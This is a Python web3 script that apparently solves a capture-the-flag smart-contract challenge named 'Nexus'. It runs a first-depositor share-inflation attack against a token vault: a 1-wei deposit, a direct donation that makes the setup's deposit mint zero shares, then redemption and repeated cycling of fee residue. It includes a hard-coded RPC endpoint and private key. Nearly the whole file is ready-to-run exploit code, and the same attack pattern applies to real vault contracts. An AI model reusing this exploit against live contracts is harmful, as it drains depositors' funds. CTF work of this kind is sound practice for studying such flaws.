"""
Nexus CTF Exploit
First-depositor vault inflation attack + friction cycling.

Attack:
1) Attune 1 wei (empty vault â†’ 1:1), get 1 crystal
2) Donate ~10k ESS directly to nexus to inflate exchange rate
3) Call conductRituals() â†’ Setup gets 0 crystals (integer division)
4) Dissolve 1 crystal â†’ get 25k * 78% = 19.5k ESS
5) Attune friction residue (5.5k) at 1:1, dissolve again â†’ 11k * 78% = 8.58k
Total: ~22.58k > 20.25k threshold âœ“
"""

from web3 import Web3
import json, time

RPC = "http://challenges.1pc.tf:32992/1a8bdc2a-79c6-45fe-ab71-a537984fc76d"
PRIVKEY = "312df9f187f56cd0c30a1e3034008df49ebffb4f6b3dc986afa2c61ac8722e9e"
SETUP_ADDR = "0xbbd1934D359B8283d6B127D417f080a097edbd0D"
WALLET_ADDR = "0x5F835750524964344B24693E5dc5186A392c9EbA"

w3 = Web3(Web3.HTTPProvider(RPC))
assert w3.is_connected(), "Not connected to RPC"
print(f"[*] Connected to chain. Block: {w3.eth.block_number}")

acct = w3.eth.account.from_key(PRIVKEY)
assert acct.address.lower() == WALLET_ADDR.lower(), f"Wallet mismatch: {acct.address}"

# Minimal ABIs
SETUP_ABI = json.loads('[{"inputs":[],"name":"essence","outputs":[{"type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"nexus","outputs":[{"type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"player","outputs":[{"type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"conductRituals","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"isSolved","outputs":[{"type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"ritualsComplete","outputs":[{"type":"bool"}],"stateMutability":"view","type":"function"}]')

ESSENCE_ABI = json.loads('[{"inputs":[{"type":"address"},{"type":"uint256"}],"name":"approve","outputs":[{"type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"type":"address"}],"name":"balanceOf","outputs":[{"type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"type":"address"},{"type":"uint256"}],"name":"transfer","outputs":[{"type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"type":"address"},{"type":"address"}],"name":"allowance","outputs":[{"type":"uint256"}],"stateMutability":"view","type":"function"}]')

NEXUS_ABI = json.loads('[{"inputs":[{"type":"uint256"}],"name":"attune","outputs":[{"type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"type":"uint256"},{"type":"address"}],"name":"dissolve","outputs":[{"type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"totalCrystals","outputs":[{"type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"type":"address"}],"name":"crystalBalance","outputs":[{"type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"amplitude","outputs":[{"type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"type":"uint256"}],"name":"essenceTocrystal","outputs":[{"type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"type":"uint256"}],"name":"crystalWorth","outputs":[{"type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"type":"address"}],"name":"calculateFriction","outputs":[{"type":"uint256"}],"stateMutability":"view","type":"function"}]')

setup = w3.eth.contract(address=SETUP_ADDR, abi=SETUP_ABI)
essence_addr = setup.functions.essence().call()
nexus_addr = setup.functions.nexus().call()
print(f"[*] Essence: {essence_addr}")
print(f"[*] Nexus: {nexus_addr}")

essence = w3.eth.contract(address=essence_addr, abi=ESSENCE_ABI)
nexus = w3.eth.contract(address=nexus_addr, abi=NEXUS_ABI)

def send_tx(fn, gas=500000):
    tx = fn.build_transaction({
        'from': acct.address,
        'nonce': w3.eth.get_transaction_count(acct.address),
        'gas': gas,
        'gasPrice': w3.eth.gas_price,
    })
    signed = acct.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return receipt

def status():
    bal = essence.functions.balanceOf(acct.address).call()
    crystals = nexus.functions.crystalBalance(acct.address).call()
    total_c = nexus.functions.totalCrystals().call()
    amp = nexus.functions.amplitude().call()
    solved = setup.functions.isSolved().call()
    print(f"  Player ESS: {Web3.from_wei(bal, 'ether')}, Crystals: {Web3.from_wei(crystals, 'ether')}")
    print(f"  TotalCrystals: {Web3.from_wei(total_c, 'ether')}, Amplitude: {Web3.from_wei(amp, 'ether')}")
    print(f"  Solved: {solved}")
    return bal, crystals, total_c, amp

print("\n[*] Initial state:")
bal, _, _, _ = status()

# Check if rituals already done
rituals_done = setup.functions.ritualsComplete().call()
print(f"  Rituals complete: {rituals_done}")

if rituals_done:
    print("[!] Rituals already done! Cannot use first-depositor attack.")
    exit(1)

ETHER = 10**18

# Step 1: Approve nexus for max
print("\n[1] Approving nexus for max ESS...")
receipt = send_tx(essence.functions.approve(nexus_addr, 2**256 - 1))
print(f"  TX: {receipt.transactionHash.hex()}, status: {receipt.status}")

# Step 2: Attune 1 wei (first deposit, 1:1)
print("\n[2] Attuning 1 wei (first depositor)...")
receipt = send_tx(nexus.functions.attune(1))
print(f"  TX: {receipt.transactionHash.hex()}, status: {receipt.status}")
status()

# Step 3: Donate remaining ESS directly to nexus
player_bal = essence.functions.balanceOf(acct.address).call()
donate_amount = player_bal  # donate all remaining
print(f"\n[3] Donating {Web3.from_wei(donate_amount, 'ether')} ESS to nexus (direct transfer)...")
receipt = send_tx(essence.functions.transfer(nexus_addr, donate_amount))
print(f"  TX: {receipt.transactionHash.hex()}, status: {receipt.status}")
status()

# Step 4: Call conductRituals()
print("\n[4] Calling conductRituals()...")
receipt = send_tx(setup.functions.conductRituals(), gas=1000000)
print(f"  TX: {receipt.transactionHash.hex()}, status: {receipt.status}")
status()

# Verify Setup got 0 crystals
setup_crystals = nexus.functions.crystalBalance(SETUP_ADDR).call()
print(f"  Setup crystals: {setup_crystals}")

# Step 5: Dissolve 1 crystal â†’ get ~78% of all ESS
print("\n[5] Dissolving 1 crystal...")
receipt = send_tx(nexus.functions.dissolve(1, acct.address))
print(f"  TX: {receipt.transactionHash.hex()}, status: {receipt.status}")
bal, _, _, _ = status()

# Step 6: Second round - attune all nexus residue (friction stays in nexus)
nexus_residue = essence.functions.balanceOf(nexus_addr).call()
print(f"\n[6] Nexus has {Web3.from_wei(nexus_residue, 'ether')} ESS residue (friction)")

# To attune it all at 1:1, we need to send exactly nexus_residue
# But we need the total to go back to nexus, so attune with nexus_residue
attune_amount = nexus_residue
if attune_amount > 0:
    print(f"  Attuning {Web3.from_wei(attune_amount, 'ether')} ESS...")
    # Need to make sure we have enough ESS
    player_bal = essence.functions.balanceOf(acct.address).call()
    if player_bal < attune_amount:
        attune_amount = player_bal
        print(f"  (adjusted to {Web3.from_wei(attune_amount, 'ether')} ESS)")
    
    receipt = send_tx(nexus.functions.attune(attune_amount))
    print(f"  TX: {receipt.transactionHash.hex()}, status: {receipt.status}")
    status()
    
    # Dissolve all crystals
    crystals = nexus.functions.crystalBalance(acct.address).call()
    print(f"\n[7] Dissolving {Web3.from_wei(crystals, 'ether')} crystals...")
    receipt = send_tx(nexus.functions.dissolve(crystals, acct.address))
    print(f"  TX: {receipt.transactionHash.hex()}, status: {receipt.status}")
    bal, _, _, _ = status()

# Could do more rounds...
nexus_residue2 = essence.functions.balanceOf(nexus_addr).call()
if nexus_residue2 > 0:
    print(f"\n[8] Another round? Nexus has {Web3.from_wei(nexus_residue2, 'ether')} ESS residue")
    player_bal = essence.functions.balanceOf(acct.address).call()
    attune_amount = min(nexus_residue2, player_bal)
    if attune_amount > 0:
        receipt = send_tx(nexus.functions.attune(attune_amount))
        crystals = nexus.functions.crystalBalance(acct.address).call()
        receipt = send_tx(nexus.functions.dissolve(crystals, acct.address))
        status()

print(f"\n{'='*60}")
solved = setup.functions.isSolved().call()
print(f"SOLVED: {solved}")
if solved:
    print("ðŸŽ‰ Challenge solved!")
print(f"{'='*60}")
